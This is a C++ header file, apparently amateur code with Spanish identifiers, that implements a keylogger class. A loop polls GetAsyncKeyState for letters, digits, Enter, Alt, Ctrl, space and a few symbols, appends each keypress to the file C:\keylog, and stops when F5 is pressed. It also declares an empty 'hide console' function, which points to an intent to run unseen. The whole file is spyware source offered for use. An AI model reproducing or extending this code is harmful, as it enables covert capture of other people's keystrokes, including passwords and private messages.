#pragma once

class keylog
{
private:
    char key;
    bool activar;
  
public:
   
   static void OcultarConsola(void)
    {
        
    }
     void CapturarTeclas(void)
    {
        std::fstream keylog("C:\\keylog", std::ios::out);
        
        activar = true;
        
        while (activar)
        {
            OcultarConsola();
            if (GetAsyncKeyState('A') == -32767)
            {
                keylog << ("A");
            }
            if (GetAsyncKeyState('B') == -32767)
            {
                keylog << "B";
            }
            if (GetAsyncKeyState('C') == -32767)
            {
                keylog << "C";
            }
            if (GetAsyncKeyState('D') == -32767)
            {
                keylog << "D";
            }
            if (GetAsyncKeyState('E') == -32767)
            {
                keylog << "E";
            }
            if (GetAsyncKeyState('F') == -32767)
            {
                keylog << "F";
            }
                if (GetAsyncKeyState('G') == -32767)
                {
                    keylog << "G";
                }
                if (GetAsyncKeyState('H') == -32767)
                {
                    keylog << "H";
                }
                if (GetAsyncKeyState('I') == -32767)
                {
                    keylog << "I";
                }
                if (GetAsyncKeyState('J') == -32767)
                {
                    keylog << "J";

                }
                if (GetAsyncKeyState('K') == -32767)
                {
                    keylog << "K";
                }
                if (GetAsyncKeyState('L') == -32767)
                {
                    keylog << "L";
                }
                if (GetAsyncKeyState('M') == -32767)
                {
                    keylog << "M";
                }
                if (GetAsyncKeyState('N') == -32767)
                {
                    keylog << "N";
                }
                if (GetAsyncKeyState('Ñ') == -32767)
                {
                    keylog << "Ñ";
                }
                if (GetAsyncKeyState('S') == -32767)
                {
                    keylog << "S";
                }
                if (GetAsyncKeyState('T') == -32767)
                {
                    keylog << "T";
                }
                if (GetAsyncKeyState('R') == -32767)
                {
                    keylog << "R";
                }
                if (GetAsyncKeyState('P') == -32767)
                {
                    keylog << "P";
                }
                if (GetAsyncKeyState('O') == -32767)
                {
                    keylog << "O";
                }
                if (GetAsyncKeyState('Q') == -32767)
                {
                    keylog << "Q";
                }
                if (GetAsyncKeyState('U') == -32767)
                {
                    keylog << "U";
                }
                if (GetAsyncKeyState('V') == -32767)
                {
                    keylog << "V";
                }
                if (GetAsyncKeyState('W') == -32767)
                {
                    keylog << "W";
                }
                if (GetAsyncKeyState('X') == -32767)
                {
                    keylog << "X";
                }
                if (GetAsyncKeyState('Y') == -32767)
                {
                    keylog << "Y";
                }
                if (GetAsyncKeyState('Z') == -32767)
                {
                    keylog << "Z";
                }
                if (GetAsyncKeyState('Ç') == -32767)
                {
                    keylog << "Ç";
                }
                //Numeros
             
                if (GetAsyncKeyState('0') == -32767)
                {
                    keylog << "0";
                }
                if (GetAsyncKeyState('1') == -32767)
                {
                    keylog << "1";
                }
                if (GetAsyncKeyState('2') == -32767)
                {
                    keylog << "2";
                }

                if (GetAsyncKeyState('3') == -32767)
                {
                    keylog << "3";
                }
                if (GetAsyncKeyState('4') == -32767)
                {
                    keylog << "4";
                }
                if (GetAsyncKeyState('5') == -32767)
                {
                    keylog << "5";
                }

                if (GetAsyncKeyState('6') == -32767)
                {
                    keylog << "6";
                }
                if (GetAsyncKeyState('7') == -32767)
                {
                    keylog << "7";
                }
                if (GetAsyncKeyState('8') == -32767)
                {
                    keylog << "8";
                }
                if (GetAsyncKeyState('9') == -32767)
                {
                    keylog << "9";
                }
                //Teclas Especiales
                if (GetAsyncKeyState(VK_RETURN) == -32767)
                {
                    keylog << " enter ";
                }
                if (GetAsyncKeyState(VK_MENU) == -32767)
                {
                    keylog << " alt ";
                }
                if (GetAsyncKeyState(VK_CONTROL) == -32767)
                {
                    keylog << " ctrl ";
                }
                if (GetAsyncKeyState(VK_CLEAR) == -32767)
                {
                    keylog << " clear ";
                }
                if (GetAsyncKeyState(VK_SPACE) == -32767)
                {
                    keylog << "   ";
                }
                if (GetAsyncKeyState('@') == -32767)
                {
                    keylog << "@";
                }
                if (GetAsyncKeyState('&') == -32767)
                {
                    keylog << "&";
                }
                if (GetAsyncKeyState('$') == -32767)
                {
                    keylog << "$";
                }

            if (GetAsyncKeyState(VK_F5) == -32767)
            {
                activar = false;
                Sleep(10);
                keylog.close();
               
            }
        }
        std::cin.ignore(std::cin.rdbuf()->in_avail());
    }
  
};